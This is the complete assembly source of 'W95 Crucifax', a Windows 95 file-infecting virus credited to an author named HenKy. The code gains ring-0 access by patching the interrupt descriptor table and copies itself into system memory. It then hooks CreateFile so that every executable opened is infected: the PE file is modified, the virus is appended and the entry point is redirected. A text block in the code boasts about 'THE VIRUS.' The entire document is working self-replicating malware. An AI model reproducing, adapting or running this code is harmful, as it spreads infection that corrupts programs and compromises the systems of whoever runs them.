   ;----------------------------  W95 CRUCIFAX BY HenKy -----------------------------
   ;
   ;-AUTHOR:        HenKy
   ;
   ;-MAIL:          HenKy_@latinmail.com
   ;
   ;-ORIGIN:        SPAIN



   .586P
   .MODEL FLAT
   LOCALS


   EXTRN       ExitProcess:PROC

   KERNEL95    EQU 0BFF70000h
   MIX_SIZ     EQU FILE_END-MEGAMIX
   MIX_MEM     EQU MEM_END-MEGAMIX
   NABLA       EQU DELTA-MEGAMIX
   MARKA       EQU 66
   FLAGZ       EQU 00000020H OR 20000000H OR 80000000H
   MAX_PATH    EQU 260
   CRATE       EQU 0BFF77ADFH
   TIMEX       EQU 0BFF771D8H

   MACROSIZE   MACRO

               DB      MIX_MEM/01000 mod 10 + "0"
               DB      MIX_MEM/00100 mod 10 + "0"
               DB      MIX_MEM/00010 mod 10 + "0"
               DB      MIX_MEM/00001 mod 10 + "0"

               ENDM



   .DATA

   DB 0

   .CODE

   MEGAMIX:


           CALL    DELTA
   DELTA:  POP     EBP
           MOV     ECX,EBP
           SUB     ECX,NABLA
           SUB     ECX,00001000H
   NEW_EIP EQU     $-4
           MOV     DWORD PTR [EBP+BASE-DELTA],ECX

           MOV     EAX,[ESP]
           XOR     AX,AX
     SZ:
           CMP     BYTE PTR [EAX],'M'
           JZ      F_GPA
           SUB     EAX,1000H
           JMP     SZ

   F_GPA:  CALL    RAZOR

   GPA_95  DB      0C2H,04H,00H,57H,6AH,22H,2Bh,0D2H

   RAZOR:
           POP     ESI
           MOV     EDI,EAX
           PUSH    EAX
           BSWAP   EAX

           CMP     AL,0BFH
           JNE     WARNING

   SCANIT:
           MOV     EDX,800000

   SCANKRNL:

           PUSH    8
           POP     ECX
           PUSH    ESI
           PUSH    EDI
           REPZ    CMPSB
           POP     EDI
           POP     ESI
           JZ      FOUND
           INC     EDI
           DEC     EDX
           JZ      WARNING
           JMP     SCANKRNL

   FOUND:
           INC     EDI
           INC     EDI
           INC     EDI
           MOV     [EBP+GPA-DELTA], EDI
           POP     EBX
   APIZ:

           LEA     ESI, [EBP+APIs-DELTA]
           LEA     EDI, [EBP+APIaddresses-DELTA]

   GPI:    PUSH    ESI
           PUSH    EBX
           CALL    [EBP+GPA-DELTA]
           CLD
           STOSD

    NPI:
           LODSB
           OR      AL, AL
           JNZ     SHORT NPI
           CMP     [ESI], AL
           JNZ     GPI

           ;LEA     ESI,[EBP+FNAME-DELTA]
           ;CALL    INFECT
           ;JMP     WARNING

           PUSHAD
           PUSH    EDX
       SIDT    [ESP-2]
       POP EDX
       ADD EDX, (5*8)+4
       MOV EBX, [EDX]
       MOV BX, [EDX-4]

       CALL    ESPINOT

   RINGO:
           PUSHAD
       CALL    DELTA2
   DELTA2:
           POP EBP
       MOV EAX, DR0
       CMP AL, '§'
       JZ      LAMB

           MOV     EDI,[EBP+CreateFile-DELTA2]
           ADD     EDI,6
           MOV     [EBP+OFFSETOR-DELTA2],EDI
           SUB     EDI,6

           LEA     ESI,[EBP+CODEIN-DELTA2]
           MOV     ECX,6
           REP     MOVSB


           MOV     EDI,0C00A45D3H
       LEA ESI, [EBP+MEGAMIX-DELTA2]
       PUSH    MIX_MEM/4
           POP     ECX
       REP     MOVSD

       MOV AL, '§'
       MOV DR0, EAX

   LAMB:
           POPAD
       IRETD

   DB     'SOMETHING HAS COME... SOMETHING HORRIBLE. '
   DB     'BUT THIS HORROR IS NOT CONFINED TO ONLY THE DARK HOURS. '
   DB     'IT WALKS IN DAYLIGHT WITH IMPUNITY, GRINING, SMIRKING. '
   DB     'THIS HORROR CANT BE STOPPED WITH A CRUCIFIX '
   DB     'IT WEARS ONE, A VERY UNUSUAL ONE '
   DB     'IT HAS NO HEART, SO A WOODEN STAKE IS USELESS. '
   DB     'IT HAS MANY NAMES, MANY FACES, HAS ALWAYS BEEN AND WILL NEVER DIE '
   DB     'IT WAS BORN OF EVIL AND IS NURTURED BY IGNORANCE '
   DB     'IT CAN ENTER YOUR LIFE AT ANY TIME...IF IT HAS NOT ALREADY. '
   DB     'IN ITS WAKE IT LEAVES ONLY DEATH AND DESPAIR. '
   DB     'IT SOILS EVERYTHING IT TOUCHES... '
   DB     'THE VIRUS.'

   CODEIN:

           PUSH    (0C00A45D3H+(CREATEFILE_HANDLER-MEGAMIX))
           RET

   ESPINOT:

           POP     EDI

       MOV [EDX-4], DI
           SHR EDI, 16
       MOV [EDX+2], DI

       INT 5

       MOV [EDX-4], BX
       SHR EBX, 16
       MOV [EDX+2], BX
       POPAD


   WARNING:

           MOV     EAX,12345678H
           ORG     $-4
   OLD_EIP DD      00001000H

           ADD     EAX,12345678H
           ORG     $-4
   BASE    DD      00400000H
           PUSH    EAX
           RET


   CREATEFILE_HANDLER:

           PUSHF
           PUSHA
           CALL    DELTOR

   DELTOR: POP     EBP
           SUB     EBP,OFFSET DELTOR
           ADD     EBP,OFFSET DELTA

           CMP     BYTE PTR [EBP+BUSO-DELTA],1
           JE      SHE_IS_HOOKER

           MOV     BYTE PTR [EBP+BUSO-DELTA],1
           MOV     ESI,[ESP+10*4]

           PUSH    ESI
   FEND:   LODSB
           OR      AL, AL
           JNZ     FEND
           MOV     EAX, [ESI-5]
           POP     ESI
           CMP     EAX, 'EXE.'
           JE      AVV
           CMP     EAX, 'exe.'
           JNE     EXIT_HOOK
   AVV:
           CALL    INFECT

   EXIT_HOOK:

           MOV     BYTE PTR [EBP+BUSO-DELTA],0

   SHE_IS_HOOKER:

           POPA
           POPF

           PUSH    EDI
           PUSH    127H
           PUSH    12345678H
           OFFSETOR EQU $-4

           RET

   BUSO    DB 0

   INFECT:

           XOR     EDX,EDX
           PUSH    EDX
           PUSH    80h
           PUSH    3
           PUSH    EDX
           PUSH    EDX
           PUSH    0C0000000h
           PUSH    ESI
           CALL    DWORD PTR [EBP+CreateFile-DELTA]

           INC     EAX
           JZ      Cerrar
           DEC     EAX
           MOV     DWORD PTR [EBP+FileHandle-DELTA],EAX  ; SAVE HNDL

           CDQ
           PUSH    EDX
           PUSH    EAX
           CALL    DWORD PTR [EBP+GetFileSize-DELTA]
           MOV     DWORD PTR [EBP+WFD_nFileSizeLow-DELTA],EAX

           MOV     ECX, DWORD PTR [EBP+WFD_nFileSizeLow-DELTA]
           CALL    CreateMap                       ; CREATE A MAP
           OR      EAX,EAX
           JZ      Cerrar
           MOV     DWORD PTR [EBP+MapHandle-DELTA],EAX
           MOV     ECX, DWORD PTR [EBP+WFD_nFileSizeLow-DELTA]
           CALL    MapFile                         ; MEMORY PROYECTION

           OR      EAX,EAX
           JZ      Cerrar
           MOV     DWORD PTR [EBP+MapAddress-DELTA],EAX
           MOV     ESI,EAX                         ; GET PE HDR
           MOV     ESI,[EAX+3CH]
           ADD     ESI,EAX
           CMP     BYTE PTR [ESI],"P"            ; IS A 'P'E ?
           JNZ     Cerrar
           CMP     BYTE PTR [ESI+MARKA],"H"     ; HenKy IS HERE ?
           JZ      Cerrar

           PUSH    DWORD PTR [ESI+3CH]
           PUSH    DWORD PTR [EBP+MapAddress-DELTA]      ; CLOSE
           CALL    DWORD PTR [EBP+UnmapViewOfFile-DELTA]
           PUSH    DWORD PTR [EBP+MapHandle-DELTA]
           CALL    DWORD PTR[EBP+CloseHandle-DELTA]
           POP     ECX
           MOV     EAX,DWORD PTR [EBP+WFD_nFileSizeLow-DELTA] ; MAP AGAIN  WIHT VIRSIZE
           ADD     EAX,MIX_SIZ

           CALL    Align

           XCHG    ECX,EAX
           MOV     DWORD PTR [EBP+NewSize-DELTA],ECX
           CALL    CreateMap
           OR      EAX,EAX
           JZ      Cerrar
           MOV     DWORD PTR [EBP+MapHandle-DELTA],EAX
           MOV     ECX,DWORD PTR [EBP+NewSize-DELTA]
           CALL    MapFile

           OR      EAX,EAX     ; IM TIRED TO REPEAT THIS SHIT !!!
           JZ      Cerrar
           MOV     DWORD PTR [EBP+MapAddress-DELTA],EAX     ; AGAIN
           MOV     ESI,[EAX+3CH]
           ADD     ESI,EAX
           MOV     EDI,ESI
           MOVZX   EAX,WORD PTR [EDI+06H]
           DEC     EAX
           IMUL    EAX,EAX,28H
           ADD     ESI,EAX
           ADD     ESI,78H
           MOV     EDX,[EDI+74H]
           SHL     EDX,3
           ADD     ESI,EDX
           PUSHAD
           CMP     DWORD PTR [ESI],"ler."
           JNZ     NO_REL
           MOV     DWORD PTR [ESI],"eti."
           MOV     WORD PTR [ESI+4],"tx"

   NO_REL:
           POPAD
           MOV     EAX,[EDI+28H]
           MOV     DWORD PTR [EBP+OLD_EIP-DELTA],EAX   ;SAVE OLD EIP
           MOV     EDX,[ESI+10H]
           MOV     EBX,EDX
           ADD     EDX,[ESI+14H]
           PUSH    EDX
           MOV     EAX,EBX
           ADD     EAX,[ESI+0CH]
           MOV     DWORD PTR [EBP+NEW_EIP-DELTA],EAX
           XCHG    EAX,[EDI+28H]   ; NEW EIP
           MOV     EAX,[ESI+10H]
           ADD     EAX,MIX_SIZ
           MOV     ECX,[EDI+3CH]

           CALL    Align

           MOV     [ESI+10H],EAX   ;NEW PHYSSIZE
           MOV     [ESI+08H],EAX   ;NEW VIRTSIZE
           POP     EDX
           MOV     EAX,[ESI+10H]
           ADD     EAX,[ESI+0CH]
           MOV     [EDI+50H],EAX   ; NEW IMAGESIZE
           OR      DWORD PTR [ESI+24H],FLAGZ
           MOV     BYTE PTR [EDI+MARKA],"H" ;  HenKy!
           LEA     ESI,[EBP+MEGAMIX-DELTA]
           XCHG    EDI,EDX
           ADD     EDI,DWORD PTR [EBP+MapAddress-DELTA]
           PUSH    (MIX_SIZ / 4)
           POP     ECX
           REP     MOVSD

   UnMapFile:

           PUSH    DWORD PTR [EBP+MapAddress-DELTA]
           CALL    DWORD PTR [EBP+UnmapViewOfFile-DELTA]

   CloseMap:

           PUSH    DWORD PTR [EBP+MapHandle-DELTA]
           CALL    DWORD PTR [EBP+CloseHandle-DELTA]

   Cerrar:

           PUSH    DWORD PTR [EBP+FileHandle-DELTA]
           CALL    DWORD PTR [EBP+CloseHandle-DELTA]
           RET


   CreateMap:

           CDQ
           PUSH    EDX
           PUSH    ECX
           PUSH    EDX
           PUSH    4H
           PUSH    EDX
           PUSH    DWORD PTR [EBP+FileHandle-DELTA]
           CALL    DWORD PTR [EBP+CreateFileMappingA-DELTA]
           RET


   MapFile:

           CDQ
           PUSH    ECX
           PUSH    EDX
           PUSH    EDX
           INC     EDX
           INC     EDX
           PUSH    EDX
           PUSH    DWORD PTR [EBP+MapHandle-DELTA]
           CALL    DWORD PTR [EBP+MapViewOfFile-DELTA]
           RET

   Align:
           PUSH    EDX
           CDQ
           PUSH    EAX
           DIV     ECX
           POP     EAX
           SUB     ECX,EDX
           ADD     EAX,ECX
           POP     EDX
           RET


   APIs:
           DB      "CreateFileA",0
           DB      "CloseHandle",0
           DB      "MapViewOfFile",0
           DB      "UnmapViewOfFile",0
           DB      "CreateFileMappingA",0
           DB      "GetFileSize",0
   Zero_   DB        0


   align 4

   FILE_END               LABEL BYTE

   copyrisgt   DB 'CRUCIFAX'

           MACROSIZE

           DB ' by HenKy',0

   APIaddresses:

   CreateFile          DD 0
   CloseHandle         DD 0
   MapViewOfFile       DD 0
   UnmapViewOfFile     DD 0
   CreateFileMappingA  DD 0
   GetFileSize         DD 0

   GPA                 DD 0
   FileHandle          DD 0
   NewSize             DD 0
   MapHandle           DD 0
   MapAddress          DD 0
   WFD_nFileSizeLow    DD 0
   ;FNAME                   DB      'TEST.ZZZ',0



   align 4


   MEM_END                LABEL BYTE

   EXITPROC:

           PUSH 0
           CALL ExitProcess

   ENDS
   END MEGAMIX
